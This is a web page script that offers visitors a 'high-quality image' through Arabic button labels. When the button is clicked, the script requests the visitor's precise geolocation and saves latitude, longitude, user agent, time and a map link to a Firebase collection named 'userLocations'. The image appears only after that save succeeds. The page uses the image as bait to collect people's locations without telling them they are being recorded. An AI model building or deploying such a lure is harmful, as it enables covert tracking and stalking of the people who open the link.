const actionButton = document.getElementById('actionButton');
const imageOverlay = document.getElementById('imageOverlay');

// Main function triggered by the button click
actionButton.addEventListener('click', () => {
    actionButton.disabled = true; // Prevent multiple clicks
    actionButton.textContent = 'Getting Location...';

    // 1. Get User Location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            successCallback, 
            errorCallback, 
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
    } else {
        alert("Geolocation is not supported by this browser.");
        resetButton();
    }
});

// --- GEOLOCATION SUCCESS HANDLER ---
function successCallback(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const timestamp = new Date();
const locationOnMap = "https://www.google.com/maps/search/?api=1&query=" + latitude + "," + longitude;

    actionButton.textContent = 'تحميل الصورة...';

    const locationData = {
        latitude: latitude,
        longitude: longitude,
        timestamp: timestamp,
        userAgent: navigator.userAgent,
        locationOnMap: locationOnMap
    };

    // 2. Save Location to Firebase Firestore
    saveLocationToFirebase(locationData)
        .then(() => {
            actionButton.textContent = 'جاري عرض الصورة...';
            // 3. Display Full-Screen Image
            showImage();
        })
        .catch((error) => {
            console.error("Error writing document: ", error);
            alert("Failed to show Image");
            resetButton();
        });
}

// --- GEOLOCATION ERROR HANDLER ---
function errorCallback(error) {
    let message;
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = "User denied the request for Geolocation. Cannot proceed.";
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Location information is unavailable.";
            break;
        case error.TIMEOUT:
            message = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
        default:
            message = "An unknown error occurred.";
            break;
    }
    console.error("Geolocation error:", message);
    //alert(message);
    resetButton();
}

// --- FIREBASE SAVE FUNCTION ---
function saveLocationToFirebase(data) {
    // Save to a collection named 'userLocations'
    return db.collection("userLocations").add(data);
}

// --- IMAGE DISPLAY FUNCTION ---
function showImage() {
    imageOverlay.style.display = 'block';
    // To hide the image again, you'd add a click listener to the overlay:
    // imageOverlay.addEventListener('click', () => {
    //     imageOverlay.style.display = 'none';
    //     resetButton();
    // }, { once: true });
}

// --- UTILITY FUNCTION ---
function resetButton() {
    actionButton.disabled = false;
    actionButton.textContent = 'عرض الصورة بجودة عالية';
}